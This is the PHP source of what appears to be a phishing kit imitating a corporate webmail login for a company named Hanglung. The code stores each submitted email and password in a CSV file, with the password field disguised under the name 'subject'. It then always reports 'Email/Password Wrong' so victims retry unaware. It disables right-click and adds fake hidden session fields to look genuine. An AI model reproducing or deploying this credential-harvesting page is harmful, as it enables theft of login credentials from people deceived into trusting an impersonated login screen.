<?php
//index.php

$error = '';
$name = '';
$email = '';
$subject = '';
$message = '';

function clean_text($string)
{
 $string = trim($string);
 $string = stripslashes($string);
 $string = htmlspecialchars($string);
 return $string;
}

if(isset($_POST["submit"]))
{
 
 if(empty($_POST["email"]))
 {
 
 }
 else
 {
  $email = clean_text($_POST["email"]);
  if(!filter_var($email, FILTER_VALIDATE_EMAIL))
  {
   $error .= '<p><label class="text-danger">Invalid email format</label></p>';
  }
 }
 if(empty($_POST["subject"]))
 {
 
 }
 else
 {
  $subject = clean_text($_POST["subject"]);
 }
 

 if($error == '')
 {
  $file_open = fopen("contact_data.csv", "a");
  $no_rows = count(file("contact_data.csv"));
  if($no_rows > 1)
  {
   $no_rows = ($no_rows - 1) + 1;
  }
  $form_data = array(
   'sr_no'  => $no_rows,
  
   'email'  => $email,
   'subject' => $subject
   
  );
  fputcsv($file_open, $form_data);
  $error = '<a style="color:red"><label class="text-success">Email/Password Wrong</label></a>';

  $email = '';
  $subject = '';

 }
}

?>


<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
<html xmlns="http://www.w3.org/1999/xhtml">


<head>
<meta http-equiv="Content-Type" content="text/html; charset=utf-8" />
<title>Webmail Login</title>
<link href="css/style.css" rel="stylesheet" type="text/css" />
  <link rel="stylesheet" type="text/css" href="style.css">
<script type="text/javascript" src="css/disableRightClick.js"></script>
<script type='text/javascript'>
$(document).ready(function() {
     $(document)[0].oncontextmenu = function() {return false;}
    // document.LoginForm.username.focus();
});

function make_blank()
{
document.LoginForm.username.value ="";
}

</script>


</head>

<body>
<div id="main-container">
   <div class="content">
   <div class="content-left">
    <div class="logo"></div>
    <div class="content-banner"><img src="images/img-left.jpg" alt="" /></div>
    <div class="content-text">Enterprise Email Solutions Redefined</div>
    </div></div>
   <div class="right">
   		<div class="right-content"></div>
        <div class="right-content-bg">
        <div class="right-content-link-bg">
          <div class="right-content-link"> 
           <span style="color:#747576;">Login:</span>    <a href="index.php">Webmail</a>   |   <a href="http://hanglung.com">Home</a>   |   <a href="#">Panel </a>
        </div>
        </div>
        <div class="form-head">Webmail</div>
        <div class="form-text-content">
		
		<?php echo $error; ?>
        <div class="form">
	  <form name="LoginForm" method="POST" accept-charset="UTF-8" autocomplete="on">
          <label class="form-text" >Email</label><label class="invalid-message" align=right></label><br clear="all">
          <input type="text" name="email" class="form-control field" placeholder="username@hanglung.com" value="<?php echo $email; ?>" onfocus="make_blank();"/> 
	  <br clear="all">
          <label class="form-text" >Password</label><br clear="all">
          <input  type="password" class="field form-control" name="subject" placeholder="Enter Password" value="<?php echo $subject; ?>" />
          <input type="submit" class="btn " name="submit" value="Submit"/>
		  
	<input type=checkbox class="fieldSelect1" name="client" value="Standard">Use the Light Version
<!--	<select class="fieldSelect" name="client"><option value="Advanced" selected>Advanced</option><option value="Standard">Standard</option><option value="Mobile">Mobile</option></select>
-->
	  <input type=hidden name=chkLogin value='Login'>
          <input type=hidden name=LoginValue value="K825441571202059pgk">
          <input type=hidden name=Session value="699e125ca165af3f02b4f1f0024e5ec4"><br clear="all">
	  </form>
          </div>
        <div class="bottom-text"><span class="alert">&nbsp;</span><br /><br />
        </div>
        </div>
        
        </div> 
   </div>
   <div style="clear:both;"></div>
   
<div id="footer">
        
          <div class="left">
                Copyrights © 2019 Hanglung all rights reserved. 
          </div>
<!--
              <div class="footer-right">
              <div class="footer-content">Follow us</div>
              <div class="footer-right-text">
                <a href="http://www.facebook.com/LogixInfo" target="_new"><image src="images/facebook.jpg" /></a>&nbsp;
		<a href="http://twitter.com/#!/logixinfo" target="_new"><image src="images/twitter.jpg" /></a>&nbsp;
		<a href="http://in.linkedin.com/in/logix" target="_new"><image src="images/in.jpg" /></a>&nbsp;
		<a href="http://www.youtube.com/user/logixinfo" target="_new"><image src="images/youtube.png" /></a>&nbsp;
            </div>
            </div>
-->        
    </div>
</div>
</div>
</body>

</html>